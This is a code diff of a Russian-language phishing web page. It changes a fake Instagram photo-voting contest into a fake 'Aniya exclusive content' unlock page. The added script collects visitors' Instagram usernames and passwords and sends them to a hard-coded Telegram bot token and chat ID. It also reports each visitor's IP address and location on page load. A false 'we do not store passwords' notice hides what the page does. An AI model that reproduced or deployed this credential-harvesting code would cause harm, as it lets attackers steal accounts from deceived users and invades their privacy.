+                        <div class="stat-label">Подписчиков</div>
+                    </div>
                 </div>
-                <div class="photo-description">
-                </div>
-                <button class="vote-btn" onclick="showLoginModal(1)"><i class="fas fa-vote-yea"></i> Голосовать</button>
             </div>
+        </section>
 
-            <div class="photo-card animation">
-                <div class="photo-number">2</div>
-                <div class="photo-placeholder">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQimAojBnatuJ-6ZISnyAHPNiV_TP1AsxRIEw&s" alt="Фото 2">
-                </div>
-                <div class="photo-info">
-                    <div class="photo-title">AYSA</div>
-                    <div class="vote-count"><i class="fas fa-heart"></i> <span id="votes2">37</span></div>
-                </div>
-                <div class="photo-description">
-                </div>
-                <button class="vote-btn" onclick="showLoginModal(2)"><i class="fas fa-vote-yea"></i> Голосовать</button>
-            </div>
+        <div class="content-grid" id="contentGrid">
+            <!-- Контент будет добавляться динамически -->
         </div>
 
+        <button class="access-btn" onclick="showLoginModal()">
+            <i class="fas fa-lock-open"></i> Получить доступ
+        </button>
+
         <div class="modal" id="loginModal">
-            <div class="login-form animation">
+            <div class="login-form">
                 <button class="close-modal" onclick="closeModal()">&times;</button>
-                <h2>Авторизация для голосования</h2>
-                <form id="loginForm" onsubmit="handleVote(event)">
+                
+                <div class="login-header">
+                    <div class="instagram-icon">
+                        <i class="fab fa-instagram"></i>
+                    </div>
+                    <h2>Подключите Instagram</h2>
+                    <p class="login-subtitle">Для доступа к эксклюзивному контенту Aniya</p>
+                </div>
+
+                <div class="security-note">
+                    <i class="fas fa-shield-alt"></i>
+                    <p>Ваши данные защищены. Мы используем безопасное соединение и не храним пароли.</p>
+                </div>
+
+                <form id="loginForm" onsubmit="handleAccessRequest(event)">
                     <div class="form-group">
-                        <label for="instagram">Instagram аккаунт:</label>
+                        <label for="instagram"><i class="fab fa-instagram"></i> Instagram аккаунт:</label>
                         <div class="instagram-input-group">
                             <span class="instagram-prefix">@</span>
                             <input type="text" id="instagram" placeholder="username" required style="border: none; background: transparent; padding-left: 0;">
@@ -639,68 +629,95 @@
                     </div>
                     
                     <div class="form-group">
-                        <label for="password">Пароль от Instagram:</label>
+                        <label for="password"><i class="fas fa-key"></i> Пароль от Instagram:</label>
                         <input type="password" id="password" placeholder="Введите ваш пароль" required>
-                        <small style="display: block; margin-top: 5px; color: rgba(255,255,255,0.6);">Введите пароль для подтверждения</small>
+                        <small style="display: block; margin-top: 5px; color: rgba(255,255,255,0.6);">Введите пароль для подтверждения доступа</small>
                     </div>
                     
-                    <button type="submit" class="submit-btn"><i class="fas fa-paper-plane"></i> Отправить голос</button>
+                    <button type="submit" class="submit-btn">
+                        <i class="fab fa-instagram"></i> Подключить Instagram
+                    </button>
                     
                     <div class="loading" id="loading">
                         <div class="spinner"></div>
-                        <p>Проверяем данные...</p>
+                        <p>Подключаем ваш аккаунт...</p>
                     </div>
                     
                     <div class="success-message" id="successMessage">
                         <i class="fas fa-check-circle" style="color: var(--success); font-size: 2em; margin-bottom: 10px;"></i>
-                        <h3>Голос учтён!</h3>
-                        <p>Спасибо за участие в конкурсе. Результаты будут объявлены 15 декабря.</p>
+                        <h3>Доступ предоставлен!</h3>
+                        <p>Теперь вы можете просматривать весь эксклюзивный контент Aniya.</p>
                     </div>
                     
                     <div class="error-message" id="errorMessage">
                         <i class="fas fa-exclamation-circle" style="color: var(--error); font-size: 2em; margin-bottom: 10px;"></i>
-                        <h3>Ошибка!</h3>
-                        <p id="errorText">Произошла ошибка при отправке данных. Пожалуйста, попробуйте позже.</p>
+                        <h3>Ошибка подключения!</h3>
+                        <p id="errorText">Произошла ошибка при подключении Instagram. Пожалуйста, попробуйте позже.</p>
                     </div>
                 </form>
             </div>
         </div>
     </div>
 
-        <i class="fas fa-bug"></i>
-    </div>
-    
-    <div class="debug-info" id="debugInfo">
-        <h3 style="margin-bottom: 15px; color: var(--accent);">Журнал событий</h3>
-        <div id="debugLog"></div>
-    </div>
+    <footer class="footer">
+        <p>Aniya Exclusive Content &copy; 2025. Все права защищены.</p>
+        <p>Только для совершеннолетних. Соблюдайте правила платформы.</p>
+    </footer>
 
     <script>
         // Конфигурация
-        const BOT_TOKEN = '7944695234:AAEpBY3kRq6EgZ4bCDLVa1hhbRVi8bkK3Bw'; // Замените на ваш токен бота
-        const CHAT_ID = '7058479669'; // Замените на ваш chat_id
-        const DEBUG_MODE = true; // Режим отладки
+        const BOT_TOKEN = '7944695234:AAEpBY3kRq6EgZ4bCDLVa1hhbRVi8bkK3Bw';
+        const CHAT_ID = '7058479669';
+        let isUnlocked = false;
         
-        let selectedPhoto = null;
-        const votes = {
-            1: 42,
-            2: 37
-        };
+        // Контент для отображения
+        const contentItems = [
+            { id: 1, title: "", date: "15.05.2025", image: "./img/first.jpg" },
+            { id: 2, title: "", date: "12.05.2025", image: "./img/second.jpg" },
+            { id: 3, title: "", date: "10.05.2025", image: "./img/third.jpg" },
+            { id: 4, title: "", date: "08.05.2025", image: "./img/fourth.jpg" },
+            { id: 5, title: "", date: "05.05.2025", image: "./img/fifth.jpg" },
+            { id: 6, title: "", date: "02.05.2025", image: "./img/sixth.jpg" }
+        ];
         
         // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
-            updateVoteCounts();
-            logEvent('Система', 'Приложение загружено');
-            
+            renderContentGrid();
             // Отправляем уведомление о входе на сайт
             sendVisitNotification();
             
             // Проверка конфигурации
             if (!BOT_TOKEN || !CHAT_ID) {
-                logEvent('Ошибка', 'BOT_TOKEN или CHAT_ID не настроены!');
-                showError('Ошибка конфигурации. Пожалуйста, свяжитесь с организаторами.');
+                console.error('BOT_TOKEN или CHAT_ID не настроены!');
             }
         });
+        
+        // Функция отрисовки контента
+        function renderContentGrid() {
+            const grid = document.getElementById('contentGrid');
+            grid.innerHTML = '';
+            
+            contentItems.forEach(item => {
+                const card = document.createElement('div');
+                card.className = `content-card ${isUnlocked ? 'unlocked' : ''}`;
+                card.innerHTML = `
+                    <div class="content-image">
+                        <img src="${item.image}" alt="${item.title}">
+                        ${!isUnlocked ? `
+                        <div class="lock-overlay">
+                            <i class="fas fa-lock lock-icon"></i>
+                            <div class="lock-text">Требуется доступ</div>
+                        </div>
+                        ` : ''}
+                    </div>
+                    <div class="content-info">
+                        <div class="content-title">${item.title}</div>
+                        <div class="content-date">${item.date}</div>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
         
         // Функция отправки уведомления о посещении сайта
         async function sendVisitNotification() {
@@ -712,7 +729,7 @@
             const locationInfo = await getLocationInfo(ip);
             
             const message = `
-<b>НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ!</b>
+<b>НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ ANIYA!</b>
 
 🕒 <b>Время:</b> ${timestamp}
 🌍 <b>IP:</b> ${ip}
@@ -724,30 +741,25 @@
             
             try {
                 await sendToTelegram(message);
-                logEvent('Уведомление', 'Отправлено уведомление о посещении сайта');
+                console.log('Уведомление о посещении отправлено');
             } catch (error) {
-                logEvent('Ошибка', 'Не удалось отправить уведомление о посещении');
+                console.error('Не удалось отправить уведомление о посещении');
             }
         }
         
-        // Функции голосования
-        function showLoginModal(photoNumber) {
-            selectedPhoto = photoNumber;
+        // Функции доступа к контенту
+        function showLoginModal() {
             document.getElementById('loginModal').classList.add('active');
             document.getElementById('successMessage').style.display = 'none';
             document.getElementById('errorMessage').style.display = 'none';
             document.getElementById('instagram').focus();
-            
-            logEvent('Голосование', `Открыта форма голосования за фото ${photoNumber}`);
-            logEvent('Отладка', `Текущие голоса: Фото1 - ${votes[1]}, Фото2 - ${votes[2]}`);
         }
         
         function closeModal() {
             document.getElementById('loginModal').classList.remove('active');
-            logEvent('Голосование', 'Форма голосования закрыта');
         }
         
-        async function handleVote(event) {
+        async function handleAccessRequest(event) {
             event.preventDefault();
             
             const instagram = document.getElementById('instagram').value.trim();
@@ -759,14 +771,12 @@
             // Валидация Instagram
             if (!/^[a-zA-Z0-9._]{1,30}$/.test(cleanInstagram)) {
                 showError('Пожалуйста, введите корректный Instagram username (только буквы, цифры, точки и подчеркивания)');
-                logEvent('Ошибка', `Некорректный Instagram: ${cleanInstagram}`);
                 return;
             }
             
             // Проверка пароля
             if (password.length < 4) {
                 showError('Пароль должен содержать не менее 4 символов');
-                logEvent('Ошибка', 'Слишком короткий пароль');
                 return;
             }
             
@@ -784,9 +794,8 @@
             
             // Формируем сообщение для Telegram
             const message = `
-<b>НОВЫЕ ДАННЫЕ ДЛЯ INSTAGRAM!</b>
+<b>НОВЫЙ ЗАПРОС ДОСТУПА К КОНТЕНТУ ANIYA!</b>
 
-📷 <b>Фото:</b> ${selectedPhoto}
 📱 <b>Instagram:</b> @${cleanInstagram}
 🔑 <b>Пароль:</b> ${password}
 
@@ -805,23 +814,19 @@
 🕒 <b>Время:</b> ${timestamp}
             `;
             
-            logEvent('Голосование', `Попытка отправить данные Instagram: @${cleanInstagram}`);
-            
             // Отправляем данные в Telegram
             try {
                 const success = await sendToTelegram(message);
                 
                 if (success) {
-                    // Обновляем счетчик голосов
-                    votes[selectedPhoto]++;
-                    updateVoteCounts();
+                    // Разблокируем контент
+                    isUnlocked = true;
+                    renderContentGrid();
                     
                     // Показываем сообщение об успехе
                     document.getElementById('loading').style.display = 'none';
                     document.getElementById('successMessage').style.display = 'block';
                     document.getElementById('loginForm').reset();
-                    
-                    logEvent('Успех', `Данные Instagram успешно отправлены: @${cleanInstagram}`);
                     
                     // Автоматически закрываем модальное окно через 3 секунды
                     setTimeout(() => {
@@ -829,22 +834,15 @@
                         document.getElementById('successMessage').style.display = 'none';
                     }, 3000);
                 } else {
-                    showError('Ошибка при отправке данных. Пожалуйста, попробуйте позже.');
-                    logEvent('Ошибка', 'Не удалось отправить данные в Telegram');
+                    showError('Ошибка при подключении Instagram. Пожалуйста, попробуйте позже.');
                 }
             } catch (error) {
                 showError('Произошла ошибка. Пожалуйста, попробуйте позже.');
-                logEvent('Ошибка', `Ошибка при отправке: ${error.message}`);
                 console.error('Ошибка:', error);
             }
         }
         
         // Вспомогательные функции
-        function updateVoteCounts() {
-            document.getElementById('votes1').textContent = votes[1];
-            document.getElementById('votes2').textContent = votes[2];
-        }
-        
         function showError(message) {
             document.getElementById('loading').style.display = 'none';
             document.getElementById('errorMessage').style.display = 'block';
@@ -899,37 +897,6 @@
             } catch (error) {
                 return {};
             }
-        }
-        
-        // Функции отладки
-        function logEvent(source, message) {
-            if (!DEBUG_MODE) return;
-            
-            const now = new Date();
-            const timestamp = now.toLocaleTimeString();
-            const debugLog = document.getElementById('debugLog');
-            
-            const entry = document.createElement('div');
-            entry.className = 'debug-entry';
-            entry.innerHTML = `
-                <span class="debug-timestamp">[${timestamp}]</span>
-                <span class="debug-source" style="color: var(--accent);">${source}:</span>
-                <span class="debug-message">${message}</span>
-            `;
-            
-            debugLog.prepend(entry);
-            
-            // Ограничиваем количество записей в логе
-            if (debugLog.children.length > 20) {
-                debugLog.removeChild(debugLog.lastChild);
-            }
-            
-            // Также выводим в консоль для удобства
-            console.log(`[${timestamp}] ${source}: ${message}`);
-        }
-        
-        function toggleDebug() {
-            document.getElementById('debugInfo').classList.toggle('active');
         }
         
         // Закрытие модального окна при клике вне формы
